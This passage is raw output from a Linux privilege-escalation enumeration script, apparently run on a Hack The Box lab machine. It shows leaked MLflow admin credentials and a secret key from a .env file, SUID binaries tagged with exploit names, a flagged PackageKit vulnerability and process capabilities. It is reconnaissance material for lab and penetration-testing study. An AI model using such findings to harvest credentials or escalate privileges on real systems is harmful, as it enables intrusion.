[1;31m[0ml[1;31m[0mo[1;31m[0ma[1;31m[0md[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m [1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0ms[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mx[1;31m[0m_[1;31m[0mh[1;31m[0mt[1;31m[0mt[1;31m[0mp[1;31m[0m_[1;31m[0mx[1;31m[0ms[1;31m[0ml[1;31m[0mt[1;31m[0m_[1;31m[0mf[1;31m[0mi[1;31m[0ml[1;31m[0mt[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m.[1;31m[0ms[1;31m[0mo[1;31m[0m;[1;31m[0m
-rw-r--r-- 1 root root 40 Apr 23 12:28 /usr/share/nginx/modules-available/mod-mail[1;31m.conf[0m
[1;31m[0ml[1;31m[0mo[1;31m[0ma[1;31m[0md[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m [1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0ms[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mx[1;31m[0m_[1;31m[0mm[1;31m[0ma[1;31m[0mi[1;31m[0ml[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m.[1;31m[0ms[1;31m[0mo[1;31m[0m;[1;31m[0m
-rw-r--r-- 1 root root 53 Apr 23 12:28 /usr/share/nginx/modules-available/mod-http-image-filter[1;31m.conf[0m
[1;31m[0ml[1;31m[0mo[1;31m[0ma[1;31m[0md[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m [1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0ms[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mx[1;31m[0m_[1;31m[0mh[1;31m[0mt[1;31m[0mt[1;31m[0mp[1;31m[0m_[1;31m[0mi[1;31m[0mm[1;31m[0ma[1;31m[0mg[1;31m[0me[1;31m[0m_[1;31m[0mf[1;31m[0mi[1;31m[0ml[1;31m[0mt[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m.[1;31m[0ms[1;31m[0mo[1;31m[0m;[1;31m[0m
-rw-r--r-- 1 root root 42 Apr 23 12:28 /usr/share/nginx/modules-available/mod-stream[1;31m.conf[0m
[1;31m[0ml[1;31m[0mo[1;31m[0ma[1;31m[0md[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m [1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0ms[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mx[1;31m[0m_[1;31m[0ms[1;31m[0mt[1;31m[0mr[1;31m[0me[1;31m[0ma[1;31m[0mm[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m.[1;31m[0ms[1;31m[0mo[1;31m[0m;[1;31m[0m
-rw-r--r-- 1 root root 49 Apr 23 12:28 /usr/share/nginx/modules-available/mod-stream-geoip2[1;31m.conf[0m
[1;31m[0ml[1;31m[0mo[1;31m[0ma[1;31m[0md[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m [1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0ms[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mx[1;31m[0m_[1;31m[0ms[1;31m[0mt[1;31m[0mr[1;31m[0me[1;31m[0ma[1;31m[0mm[1;31m[0m_[1;31m[0mg[1;31m[0me[1;31m[0mo[1;31m[0mi[1;31m[0mp[1;31m[0m2[1;31m[0m_[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0m.[1;31m[0ms[1;31m[0mo[1;31m[0m;[1;31m[0m

drwxr-xr-x 7 root root 4096 Sep 16  2025 /var/lib/[1;31mnginx[0m

drwxr-xr-x 2 root adm 4096 May 13 15:27 /var/log/[1;31mnginx[0m


[1;34m╔══════════╣ [1;32mBrowser Profiles [1;90m(T1539,T1217)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#browser-data
[0m
[1;34m╔══════════╣ [1;32mChecking if containerd/CRI tooling is available [1;90m(T1613)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/container-security/runtime-api-and-daemon-exposure.html
[0m[1;31mcontainerd was found in /usr/bin/containerd[0m
[1;31mctr was found in /usr/bin/ctr, you may be able to inspect or manage containerd content with it[0m
time="2026-07-02T03:33:35Z" level=warning msg="Failed to check deprecations" error="connection error: desc = \"transport: Error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied\""
ctr: failed to list images: connection error: desc = "transport: Error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied"

[1;34m╔══════════╣ [1;32mSearching docker files (limit 70) [1;90m(T1613)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/container-security/index.html
[0mlrwxrwxrwx 1 root root 33 Sep 16  2025 /etc/systemd/system/sockets.target.wants/docker.socket -> /lib/systemd/system/docker.socket
-r-x------ 1 root root 523 Sep 17  2025 /opt/mlflow/Dockerfile
-rw-r--r-- 1 root root 171 Feb 11 11:08 /usr/lib/systemd/system/docker.socket
-rw-r--r-- 1 root root 0 Sep 16  2025 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket

[1;34m╔══════════╣ [1;32mAnalyzing Rsync Files (limit 70)
[0m-rw-r--r-- 1 root root 1044 Oct 11  2022 /usr/share/doc/rsync/examples/[1;31mrsyncd.conf[0m
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


[1;34m╔══════════╣ [1;32mAnalyzing PAM Auth Files (limit 70)
[0mdrwxr-xr-x 2 root root 4096 May 13 12:41 /etc/[1;31mpam.d[0m
-rw-r--r-- 1 root root 2133 Apr 11  2025 /etc/pam.d/[1;31msshd[0m
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so [1;31muser[0m_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open

[1;31mdrwxr-xr-x 2 root root 4096 May 13 12:41 /etc/pam.d[0m
[1;31m-rw-r--r-- 1 root root 138 Feb 20  2022 /etc/pam.d/runuser-l[0m
[1;31m-rw-r--r-- 1 root root 92 Nov 11  2021 /etc/pam.d/chpasswd[0m
[1;31m-rw-r--r-- 1 root root 119 Dec  5  2023 /etc/pam.d/vmtoolsd[0m
[1;31m-rw-r--r-- 1 root root 4126 Mar 14  2022 /etc/pam.d/login[0m
[1;31m-rw-r--r-- 1 root root 606 Mar 17  2021 /etc/pam.d/cron[0m
[1;31m-rw-r--r-- 1 root root 1427 May 13 12:41 /etc/pam.d/common-session[0m
session	[default=1]			[1;31mpam_permit.so[0m
session	required			[1;31mpam_permit.so[0m
[1;31m-rw-r--r-- 1 root root 270 Feb 26  2022 /etc/pam.d/polkit-1[0m
[1;31m-rw-r--r-- 1 root root 520 Aug 12  2020 /etc/pam.d/other[0m
[1;31m-rw-r--r-- 1 root root 384 Nov 11  2021 /etc/pam.d/chfn[0m
auth		sufficient	[1;31mpam_rootok.so[0m
[1;31m-rw-r--r-- 1 root root 1435 May 13 12:41 /etc/pam.d/common-session-noninteractive[0m
session	[default=1]			[1;31mpam_permit.so[0m
session	required			[1;31mpam_permit.so[0m
[1;31m-rw-r--r-- 1 root root 330 Aug  3  2022 /etc/pam.d/sudo[0m
[1;31m-rw-r--r-- 1 root root 315 Aug  3  2022 /etc/pam.d/sudo-i[0m
[1;31m-rw-r--r-- 1 root root 92 Nov 11  2021 /etc/pam.d/passwd[0m
[1;31m-rw-r--r-- 1 root root 581 Nov 11  2021 /etc/pam.d/chsh[0m
auth		sufficient	[1;31mpam_rootok.so[0m
[1;31m-rw-r--r-- 1 root root 2259 Feb 20  2022 /etc/pam.d/su[0m
auth       sufficient [1;31mpam_rootok.so[0m
[1;31m-rw-r--r-- 1 root root 1620 May 13 12:41 /etc/pam.d/common-password[0m
password	required			[1;31mpam_permit.so[0m
[1;31m-rw-r--r-- 1 root root 92 Nov 11  2021 /etc/pam.d/newusers[0m
[1;31m-rw-r--r-- 1 root root 1208 May 13 12:41 /etc/pam.d/common-account[0m
account	required			[1;31mpam_permit.so[0m
[1;31m-rw-r--r-- 1 root root 143 Feb 20  2022 /etc/pam.d/runuser[0m
auth		sufficient	[1;31mpam_rootok.so[0m
[1;31m-rw-r--r-- 1 root root 1242 May 13 12:41 /etc/pam.d/common-auth[0m
auth	[success=1 default=ignore]	[1;31mpam_unix.so nullok[0m
auth	required			[1;31mpam_permit.so[0m
[1;31m-rw-r--r-- 1 root root 2133 Apr 11  2025 /etc/pam.d/sshd[0m
[1;31m-rw-r--r-- 1 root root 137 Feb 20  2022 /etc/pam.d/su-l[0m


[1;34m╔══════════╣ [1;32mAnalyzing Ldap Files (limit 70)
[0mThe password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 May 13 12:40 /etc/[1;31mldap[0m


[1;34m╔══════════╣ [1;32mAnalyzing Keyring Files (limit 70)
[0mdrwxr-xr-x 2 root root 4096 Apr  8  2022 /etc/apt/[1;31mkeyrings[0m
drwxr-xr-x 2 root root 4096 May 13 12:37 /usr/share/[1;31mkeyrings[0m




[1;34m╔══════════╣ [1;32mAnalyzing FastCGI Files (limit 70)
[0m-rw-r--r-- 1 root root 1055 May 30  2023 /etc/nginx/[1;31mfastcgi_params[0m

[1;34m╔══════════╣ [1;32mAnalyzing Postfix Files (limit 70)
[0m-rw-r--r-- 1 root root 10940 Sep 11  2024 /usr/share/mime/[1;31maliases[0m

-rw-r--r-- 1 root root 761 Nov 15  2021 /usr/share/bash-completion/completions/[1;31mpostfix[0m


[1;34m╔══════════╣ [1;32mAnalyzing Env Files (limit 70)
[0m-rw-r--r-- 1 svcweb svcweb 161 Sep 15  2025 /var/www/smarthire.htb/[1;31m.env[0m
MLFLOW_TRACKING_URI=http://127.0.0.1:5000
MLFLOW_TRACKING_USERNAME=admin
MLFLOW_TRACKING_[1;31mPASSWORD=password[0m
SMARTHIRE_SECRET_[1;31mKEY[0m=b9c53f2f4459ee6ed15f7f85c0549861

[1;34m╔══════════╣ [1;32mAnalyzing Proxy Config Files (limit 70)
[0m-rw-r--r-- 1 root root 106 Sep 11  2024 /etc/[1;31menvironment[0m



[1;34m╔══════════╣ [1;32mAnalyzing DNS Files (limit 70)
[0m-rw-r--r-- 1 root root 826 Nov 15  2021 /usr/share/bash-completion/completions/[1;31mbind[0m
[1;31m-rw-r--r-- 1 root root 826 Nov 15  2021 /usr/share/bash-completion/completions/bind[0m




[1;34m╔══════════╣ [1;32mAnalyzing Interesting logs Files (limit 70)
[0m-rw-r--r-- 1 root root 60453848 Jul  2 03:33 /var/log/nginx/[1;31maccess.log[0m

-rw-r--r-- 1 root root 0 May 13 15:27 /var/log/nginx/[1;31merror.log[0m

[1;34m╔══════════╣ [1;32mAnalyzing Other Interesting Files (limit 70)
[0m-rw-r--r-- 1 root root 3771 Jan  6  2022 /etc/skel/[1;31m.bashrc[0m
-rw-r--r-- 1 svcweb svcweb 3771 Jan  6  2022 /home/svcweb/[1;31m.bashrc[0m





-rw-r--r-- 1 root root 807 Jan  6  2022 /etc/skel/[1;31m.profile[0m
-rw-r--r-- 1 svcweb svcweb 807 Jan  6  2022 /home/svcweb/[1;31m.profile[0m



-rw-r--r-- 1 svcweb svcweb 0 Sep 15  2025 /home/svcweb/[1;31m.sudo_as_admin_successful[0m

[1;34m╔══════════╣ [1;32mAnalyzing FreeIPA Files (limit 70)
[0mdrwxr-xr-x 2 root root 4096 May 13 12:47 /usr/src/linux-headers-5.15.0-177/drivers/net/[1;31mipa[0m




[1;34m╔══════════╣ [1;32mSearching mysql credentials and exec [1;90m(T1552.001)
[0m
[1;32mMySQL process not found.[0m
[1;34m╔══════════╣ [1;32mAnalyzing PGP-GPG Files (limit 70)
[0m/usr/bin/gpg
[1;90mnetpgpkeys Not Found
[0m[1;90mnetpgp Not Found
[0m
-rw-r--r-- 1 root root 2794 Mar 26  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage[1;31m.gpg[0m
-rw-r--r-- 1 root root 1733 Mar 26  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive[1;31m.gpg[0m
-rw------- 1 svcweb svcweb 1200 Sep 19  2025 /home/svcweb/.gnupg/trustdb[1;31m.gpg[0m



-rw------- 1 svcweb svcweb 32 Sep 19  2025 /home/svcweb/.gnupg/[1;31mpubring.kbx[0m

-rw------- 1 svcweb svcweb 1200 Sep 19  2025 /home/svcweb/.gnupg/[1;31mtrustdb.gpg[0m




drwx------ 3 svcweb svcweb 4096 Jul  2 03:33 /home/svcweb/[1;31m.gnupg[0m

[1;34m╔══════════╣ [1;32mChecking for PackageKit Pack2TheRoot (CVE-2026-41651) [1;90m(T1068)
[0m[1;34m╚ [1;34m[3mhttps://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html
[0mPackageKit version detected: 1.2.5
[1;31;103mVulnerable to CVE-2026-41651 (Pack2TheRoot) - PackageKit 1.2.5 is in the vulnerable range >=1.0.2 <=1.3.4[0m

[1;34m══╣ [1;32mPackageKit daemon reachability
[0m[1;31mpkcon/pkmon present - daemon can be activated on demand via D-Bus[0m

[1;34m══╣ [1;32mIOC: emitted_finished assertion failures
[0mNo emitted_finished assertion failures found in PackageKit logs


[1;34m╔══════════╣ [1;32mChecking if runc is available [1;90m(T1613,T1611)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#runc--privilege-escalation
[0m[1;31mrunc was found in /usr/sbin/runc, you may be able to escalate privileges with it[0m

[1;34m╔══════════╣ [1;32mSearching screen sessions [1;90m(T1563)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions
[0mScreen version 4.09.00 (GNU) 30-Jan-22
[1;31m[32mNo Sockets found in /run/screen/S-svcweb.[0m[0m
[1;31m[0m
[1;31m/run/screen/S-svcweb[0m[1;34m══╣ [1;32mChecking other users screen sessions [1;90m(T1563)
[0mUser root screen sessions:
[1;31mMust run suid root for multiuser support.[0m

[1;34m╔══════════╣ [1;32mSearching uncommon passwd files (splunk) [1;90m(T1552.001)
[0mpasswd file: [1;31m/etc/pam.d/passwd[0m
passwd file: [1;31m/etc/passwd[0m
passwd file: [1;31m/usr/share/bash-completion/completions/passwd[0m
passwd file: [1;31m/usr/share/lintian/overrides/passwd[0m

[1;34m╔══════════╣ [1;32mSearching ssl/ssh files [1;90m(T1552.004,T1021.004)
[0m[1;34m╔══════════╣ [1;32mAnalyzing SSH Files (limit 70)
[0m



-rw------- 1 svcweb svcweb 0 May 12 15:21 /home/svcweb/.ssh/[1;31mauthorized_keys[0m

-rw-r--r-- 1 root root 176 Sep 15  2025 /etc/ssh/ssh_host_ecdsa_key[1;31m.pub[0m
-rw-r--r-- 1 root root 96 Sep 15  2025 /etc/ssh/ssh_host_ed25519_key[1;31m.pub[0m
-rw-r--r-- 1 root root 568 Sep 15  2025 /etc/ssh/ssh_host_rsa_key[1;31m.pub[0m

PermitRootLogin prohibit-password
PubkeyAuthentication yes
PasswordAuthentication no
ChallengeResponseAuthentication no
UsePAM no
[1;34m══╣ [1;32mSome certificates were found (out limited): [1;90m(T1552.004,T1021.004)
[0m/etc/pki/fwupd/LVFS-CA.pem
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Atos_TrustedRoot_Root_CA_ECC_TLS_2021.pem
/etc/ssl/certs/Atos_TrustedRoot_Root_CA_RSA_TLS_2021.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem


[1;34m══╣ [1;32mSome home ssh config file was found [1;90m(T1552.004,T1021.004)
[0m[1;31m/usr/share/openssh/sshd_config[0m
Include /etc/ssh/sshd_config.d/*.conf
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server

[1;34m══╣ [1;32m/etc/hosts.allow file found, trying to read the rules: [1;90m(T1552.004,T1021.004)
[0m/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
[1;31mHost[0m *
    SendEnv LANG LC_*
    HashKnown[1;31mHost[0ms yes
    GSSAPIAuthentication yes




[1;34m                      ╔════════════════════════════════════╗
══════════════════════╣ [1;32mFiles with Interesting Permissions[1;34m ╠══════════════════════
[1;34m                      ╚════════════════════════════════════╝[0m
[1;34m╔══════════╣ [1;32mSUID - Check easy privesc, exploits and write perms [1;90m(T1548.001)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
[0m-rwsr-xr-x 1 root root 331K Apr 28 00:38 /usr/lib/openssh[1;32m/ssh-keysign[0m
-rwsr-xr-- 1 root messagebus 35K Oct 25  2022 /usr/lib/dbus-1.0[1;32m/dbus-daemon-launch-helper[0m
-rwsr-xr-x 1 root root 23K Apr 10 10:59 /usr/libexec[1;32m/polkit-agent-helper-1[0m
-rwsr-xr-x 1 root root 35K Mar  6 16:10 /usr/bin[1;31m/umount  --->  BSD/Linux(08-1996)[0m
-rwsr-xr-x 1 root root 31K Apr 10 10:59 /usr/bin[1;31m/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034[0m
-rwsr-xr-x 1 root root 72K Feb  6  2024 /usr/bin[1;31m/chfn  --->  SuSE_9.3/10[0m
-rwsr-xr-x 1 root root 227K Mar  2 13:08 /usr/bin[1;31m/sudo  --->  check_if_the_sudo_version_is_vulnerable[0m
-rwsr-xr-x 1 root root 59K Feb  6  2024 /usr/bin[1;31m/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)[0m
-rwsr-xr-x 1 root root 35K Mar 23  2022 /usr/bin[1;32m/fusermount3[0m
-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin[1;32m/chsh[0m
-rwsr-xr-x 1 root root 55K Mar  6 16:10 /usr/bin[1;32m/su[0m
-rwsr-xr-x 1 root root 47K Mar  6 16:10 /usr/bin[1;31m/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8[0m
-rwsr-xr-x 1 root root 40K Feb  6  2024 /usr/bin[1;31m/newgrp  --->  HP-UX_10.20[0m
-rwsr-xr-x 1 root root 71K Feb  6  2024 /usr/bin[1;32m/gpasswd[0m

[1;34m╔══════════╣ [1;32mSGID [1;90m(T1548.001)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
[0m-rwxr-sr-x 1 root utmp 15K Mar 24  2022 /usr/lib/x86_64-linux-gnu/utempter[1;32m/utempter[0m
-rwxr-sr-x 1 root shadow 71K Feb  6  2024 /usr/bin[1;32m/chage[0m
-rwxr-sr-x 1 root _ssh 287K Apr 28 00:38 /usr/bin[1;32m/ssh-agent[0m
-rwxr-sr-x 1 root crontab 39K Mar 23  2022 /usr/bin[1;32m/crontab[0m
-rwxr-sr-x 1 root shadow 23K Feb  6  2024 /usr/bin[1;32m/expiry[0m
-rwxr-sr-x 1 root shadow 23K Jun 12  2025 /usr/sbin[1;32m/pam_extrausers_chkpwd[0m
-rwxr-sr-x 1 root shadow 27K Jun 12  2025 /usr/sbin[1;32m/unix_chkpwd[0m

[1;34m╔══════════╣ [1;32mFiles with ACLs (limited to 50) [1;90m(T1222)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls
[0m[1;90mfiles with acls in searched folders Not Found
[0m
[1;34m╔══════════╣ [1;32mCapabilities [1;90m(T1548.001)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities
[0m[1;34m══╣ [1;32mCurrent shell capabilities [1;90m(T1548.001)
[0mCapInh:  0x0000000000000000=
CapPrm:  0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:  0x000001ffffffffff=[1;31mcap_chown[0m,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:  0x0000000000000000=

[1;34m╚ [1;34m[3mParent process capabilities
[0mCapInh:	 0x0000000000000000=
CapPrm:	 0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:	 0x000001ffffffffff=[1;31mcap_chown[0m,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:	 0x0000000000000000=

[1;34m══╣ [1;32mProcesses with capability sets (non-zero CapEff/CapAmb, limit 40) [1;90m(T1548.001)
[0mPID 1 (systemd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 2 (kthreadd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
